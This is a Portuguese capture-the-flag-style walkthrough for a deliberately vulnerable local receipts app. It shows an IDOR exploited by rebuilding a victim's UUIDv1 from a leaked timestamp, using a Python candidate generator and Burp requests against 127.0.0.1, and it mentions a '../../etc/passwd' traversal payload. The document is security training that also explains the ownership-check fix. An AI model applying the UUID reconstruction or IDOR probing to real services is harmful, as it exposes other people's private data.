# Walkthrough — idor-uuid-guessable

## 1. Contexto

A app é um pequeno serviço de "recibos". Todo recibo tem um owner, um item, um valor e um timestamp `issued_at`, e cada um vive no seu próprio link privado: `GET /receipt/<uuid>`. O modelo mental do desenvolvedor é que o UUID nesse link *é* a proteção — o id é longo e com cara de aleatório, então "só quem recebeu o link consegue abrir o recibo". Um dashboard em `GET /` lista o owner e a hora de emissão de todos os recibos, o que o desenvolvedor trata como metadado inofensivo; o detalhe sensível fica atrás do link impossível de adivinhar.

Você vai ler o recibo de outra usuária sem nunca ter recebido o link dela — reconstruindo o UUID a partir de dados que a app te entrega. E, no fim, vai ver que nem precisava reconstruir nada: o endpoint nunca checa quem está pedindo, então qualquer id válido teria bastado. Duas camadas, uma causa raiz — não existe check de autorização.

Esta é a mesma classe do `idor-numeric-id`, de propósito. Lá, o id era um inteiro sequencial e o "exploit" era contar `1, 2, 3`. A lição óbvia-mas-errada daquele átomo é "não use ids adivinháveis — use UUIDs". Este átomo é a refutação: o id *é* um UUID, e não mudou nada, porque a enumerabilidade nunca foi a doença. O ownership check ausente é.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/receipt/<uuid>` é curta:

```python
@app.route("/receipt/<uuid:receipt_id>")
def view_receipt(receipt_id):
    r = RECEIPTS.get(str(receipt_id))
    if r is None:
        abort(404)
    # VULNERABLE: no ownership check ...
    return render_template("receipt.html", receipt=r)
```

Leia duas vezes. Ela procura um recibo por id e devolve. Nada concatena input num sink perigoso; não tem filter de template arriscado. O bug é **o que não está lá**: nenhuma comparação entre `r["owner"]` e o usuário que chamou. A função confia que "se você pediu este recibo, você pode vê-lo" — e segurar um UUID é tratado como prova disso. Não é.

Como no `idor-numeric-id`, esta classe não dá `grep`. Não tem `f"`, `|safe`, nem `eval` pra achar. Você audita lendo endpoints que retornam objetos escopados a usuário e perguntando, pra cada um: **onde isto verifica que o caller é dono do objeto?** Aqui a resposta é "em lugar nenhum".

Repare que o render é autoescapado (`{{ }}` sem `|safe`), incluindo o `X-User-ID` ecoado no dashboard. Esse escape **não é** o fix de IDOR — é higiene pra manter o átomo em exatamente um bug (um header controlado pelo atacante, sem escape, empilharia um reflected XSS por cima). O único bug aqui é o check ausente.

## 3. Como funciona a "auth" deste lab

Auth de verdade está fora do escopo (ver o README). Como no `idor-numeric-id`, simulamos "quem está logado" com um único header auto-declarado, **`X-User-ID`**. Dois usuários no seed:

- **`mallory`** — a atacante (você). Se você não manda header, a app te trata como `mallory`.
- **`alice`** — a vítima, cujo recibo é seedado no startup.

Duas coisas pra ter em mente: o header é auto-declarado (você pode dizer que é qualquer um), e — o cerne — a view vulnerable `/receipt/<uuid>` nunca lê ele. O Passo 5 torna isso concreto.

## 4. Exploração via Burp Suite (trilha principal)

Aponte o browser pro Burp, visite <http://127.0.0.1:8011/>, e mande os requests abaixo do Repeater. O Burp planta e varia os requests; a única parte que o Burp não faz — a aritmética que transforma um timestamp de volta num UUID — é uma dúzia de linhas de Python que você roda ao lado.

> **Os valores abaixo são de uma sessão real.** Um UUIDv1 embute a hora de relógio em que foi gerado, e o gerador sorteia um clock sequence novo a cada boot do container, então os seus ids e timestamps *vão diferir*. A cadeia é idêntica e reproduzível — só o hex exato muda.

### Baseline — gere e leia o seu próprio recibo

Crie um recibo como você mesma:

```
POST /receipt HTTP/1.1
Host: 127.0.0.1:8011
X-User-ID: mallory
Content-Length: 0
```

A response renderiza o seu recibo. O id dele é um **UUIDv1**:

```
Receipt id: 184dae7c-7ba1-11f1-b8a9-56b2c594786d
Issued at:  2026-07-09T14:18:45.289126+00:00
Owner:      mallory
```

Leia de volta pra confirmar que a feature funciona — `GET /receipt/184dae7c-7ba1-11f1-b8a9-56b2c594786d` com `X-User-ID: mallory` retorna 200 e o seu recibo. Guarde este id: ele é a sua amostra do gerador.

### Passo 1 — Leia o metadado que a app vaza

Peça o dashboard:

```
GET / HTTP/1.1
Host: 127.0.0.1:8011
```

A tabela de overview lista o owner e o `issued_at` de todos os recibos — incluindo o da alice, em precisão de microssegundos, e **sem o UUID dela**:

```
Owner    Issued at
alice    2026-07-09T14:16:02.668144+00:00
mallory  2026-07-09T14:18:45.289126+00:00
```

Você não tem o link do recibo da alice. Mas agora tem a hora exata de emissão dela e (do Baseline) um UUIDv1 gerado pelo mesmo processo. Isso basta.

### Passo 2 — Recupere o fingerprint do gerador (node + clock_seq)

Um UUIDv1 não é aleatório. Ele é `timestamp | clock_sequence | node`, e o Python expõe cada campo. Parse o seu próprio id:

```python
import uuid
mine = uuid.UUID("184dae7c-7ba1-11f1-b8a9-56b2c594786d")
print(hex(mine.node), mine.clock_seq)   # 0x56b2c594786d 14505
```

O `node` (aqui o MAC do container) e o `clock_seq` são **constantes de processo** — a app fixa os dois durante a vida do processo — então o id da alice carrega o *mesmo* `node` e `clock_seq` que o seu. Dá pra ver a olho nu: o seu id termina em `-b8a9-56b2c594786d`, e o dela também vai terminar. Só os campos de tempo diferem entre os dois.

> **Sub-lição.** Que o `clock_seq` seja estável é a app sendo *fiel à RFC 4122*, que manda escolher um clock sequence aleatório e então persisti-lo. O `uuid.uuid1()` do Python calha de sortear um `clock_seq` aleatório novo a cada chamada — uma mitigação acidental que teria bloqueado este passo. Seguir o padrão aqui deixa o id *mais* previsível, não menos.

### Passo 3 — Reconstrua o UUID da vítima (~10 candidatos)

Você sabe o `node` e o `clock_seq` da alice (Passo 2) e o `issued_at` dela ao microssegundo (Passo 1). Um timestamp v1 conta ticks de 100 nanossegundos, então um microssegundo são dez ticks: fixar o tempo ao microssegundo deixa exatamente um dígito desconhecido — **dez candidatos de UUID**. Reconstrua-os:

```python
import uuid
from datetime import datetime, timezone, timedelta

UUID_EPOCH_100NS = 0x01b21dd213814000
UNIX_EPOCH = datetime(1970, 1, 1, tzinfo=timezone.utc)

mine = uuid.UUID("184dae7c-7ba1-11f1-b8a9-56b2c594786d")     # seu próprio recibo
node, clock_seq = mine.node, mine.clock_seq                  # constantes de processo

issued_at = datetime.fromisoformat("2026-07-09T14:16:02.668144+00:00")  # alice, do dashboard
us = (issued_at - UNIX_EPOCH) // timedelta(microseconds=1)
base = us * 10 + UUID_EPOCH_100NS

def build_v1(t, node, clock_seq):
    fields = (t & 0xffffffff, (t >> 32) & 0xffff, (t >> 48) & 0x0fff,
              (clock_seq >> 8) & 0x3f, clock_seq & 0xff, node)
    return uuid.UUID(fields=fields, version=1)

for d in range(10):
    print(build_v1(base + d, node, clock_seq))
```

Saída — dez UUIDs que diferem só no último dígito de tempo:

```
b75fb060-7ba0-11f1-b8a9-56b2c594786d
b75fb061-7ba0-11f1-b8a9-56b2c594786d
...
b75fb069-7ba0-11f1-b8a9-56b2c594786d
```

Um deles é o id real do recibo da alice. (Nesta sessão foi o quinto, `...b75fb064...`; o seu vai cair num dígito diferente.)

### Passo 4 — Acesse o recibo da vítima (IDOR confirmado)

Mande os dez candidatos no endpoint privado — Repeater, editando o último dígito a cada vez (ou jogue-os no Intruder como uma lista de dez payloads):

```
GET /receipt/b75fb064-7ba0-11f1-b8a9-56b2c594786d HTTP/1.1
Host: 127.0.0.1:8011
X-User-ID: mallory
```

Nove retornam **404**. Um retorna **200** — o recibo da alice:

```
Receipt id: b75fb064-7ba0-11f1-b8a9-56b2c594786d
Owner:      alice
Item:       Noise-cancelling headphones
Amount:     $1,299.00
Issued at:  2026-07-09T14:16:02.668144+00:00
```

Isso é o IDOR. Você leu o recibo de outra usuária sem nunca ter recebido o link — você reconstruiu o link a partir de um timestamp num dashboard e de um UUID seu. O `issued_at` no recibo retornado bate exatamente com a linha do dashboard, confirmando que você acertou o registro real da alice.

### Passo 5 — Prove que o bug é "check ausente", não "id adivinhável"

A reconstrução é dramática, mas pode te enganar a achar que o bug é "o UUID era adivinhável". Não é. Mantenha o path no **seu próprio** recibo — um id que você legitimamente possui — e mude só o header, dizendo que é a alice:

```
GET /receipt/184dae7c-7ba1-11f1-b8a9-56b2c594786d HTTP/1.1
Host: 127.0.0.1:8011
X-User-ID: alice
```

Response: **200, ainda o seu próprio recibo (owner `mallory`), inalterado.** Mande de novo como `X-User-ID: mallory` — idêntico. A view nunca lê o `X-User-ID`; não tem identidade pra spoofar e nada que o header mude.

Sente no que isso prova, em duas camadas:

- **Camada 1 — obscuridade nunca foi o controle.** O endpoint não checa quem você é, então *qualquer* id que você segure — por mais aleatório que seja — é servido. É por isso que trocar pra um `uuid4` sozinho não corrigiria isto: v4 muda quão difícil é *adivinhar* o id, não se o servidor *confere ownership*. No instante em que um atacante obtém um id válido — link compartilhado, header `Referer`, linha de log, histórico do browser — o recibo é dele.
- **Camada 2 — e este id nem era difícil de adivinhar.** Os Passos 2–4 o reconstruíram a partir de um timestamp e de um node que a app entregou.

Uma causa raiz embaixo das duas: não existe check de autorização.

## 5. Por que isto é IDOR, e por que o UUID nunca ajudou

No `idor-numeric-id` dissemos, sobre o fix daquele átomo, que trocar o inteiro por um UUID seria *"obfuscation... teatro"* — que "UUIDs, signed tokens, URLs escondidas, rate limits ... só mudam quanto custa *achar* o bug". Este átomo encena a peça: o id **é** um UUID, e não mudou nada, porque o check ausente — não o formato do id — sempre foi o bug. Pior, um UUIDv1 te devolve o próprio timestamp e node, então ele nem é o segredo aleatório que todo mundo assume.

| Átomo (A01) | Objeto alcançado por… | O id é… | Check ausente |
|---|---|---|---|
| `idor-numeric-id` | trocar um id (`/notes/1` → `/notes/2`) | inteiro sequencial | ownership (a nota é sua?) |
| `idor-uuid-guessable` | reconstruir e usar o UUID | **UUIDv1 reconstruível** | ownership (o recibo é seu?) — **o mesmo check** |
| `path-traversal-basic` | navegar o filesystem (`notes.txt` → `../../etc/passwd`) | caminho de arquivo | confinamento (o path ficou na pasta?) |

Os três são "a app te entregou algo que não era seu". O `idor-numeric-id` e este átomo dividem exatamente a mesma causa e o mesmo fix — um ownership check — e diferem só no formato do id, que é justamente o ponto. O `path-traversal-basic` é a mesma família por outro eixo (confinar um caminho em vez de possuir um objeto).

## 6. Impacto

Escalação horizontal de privilégio: você leu o recibo de outra usuária do mesmo nível — o item dela, o valor, a hora da compra. Esse é o teto honesto. **Não é RCE, e não é escalação vertical** — você não ganhou execução de código nem um papel elevado. Num alvo real, dados de recibo/pedido costumam ser PII que *encadeia* pra mais ataques, mas o achado em si é a leitura cross-user.

## 7. Exploração via browser (trilha secundária, opcional)

Só pro baseline, o browser é a primeira passada de baixa fricção: abra <http://127.0.0.1:8011/>, clique em **Create my receipt** pra gerar o seu, abra-o pra ver o id, e leia o `issued_at` da alice na tabela do dashboard. Mas o browser não seta `X-User-ID`, e certamente não faz a aritmética da reconstrução — então os Passos 2–5 são Burp-mais-script, exatamente como o passo de "check ausente" do `idor-numeric-id` não tinha equivalente no browser. O Burp é a trilha principal.

## 8. Por que o fix funciona

Rode a cadeia inteira contra a app fixed na porta **8111** (veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança):

- **O ownership check (o fix que importa).** Gere um recibo lá como `mallory`, depois peça-o com `X-User-ID: alice`: **403 Forbidden**. Você segura um id perfeitamente válido e ainda assim é recusada, porque a view fixed compara `r["owner"]` com o caller antes de devolver. Pedindo como `mallory`, retorna 200. Este único check fecha o IDOR.
- **UUIDv4 (defense-in-depth).** A app fixed gera ids com `uuid4` — sorteado de um CSPRNG, sem timestamp nem node embutidos — então o id que você recebe de volta é um v4 e a reconstrução do Passo 3 não tem de onde partir. Mas repare o que isso *não* faz sozinho: mantenha o check ausente e só troque o gerador, e qualquer id que um atacante obtenha ainda abre o recibo. A troca do gerador fecha a rota de *reconstrução*; o check fecha o *acesso*.
- **O dashboard continua vazando o `issued_at`**, byte a byte como antes. Agora é inerte — v4 não dá pra reconstruir de um timestamp, e o check recusaria o acesso de qualquer forma. Prova de que o vazamento de metadado nunca foi a vulnerabilidade.

A ordem é a lição: **o ownership check é o fix; o UUIDv4 é defense-in-depth.** Vá no check primeiro.
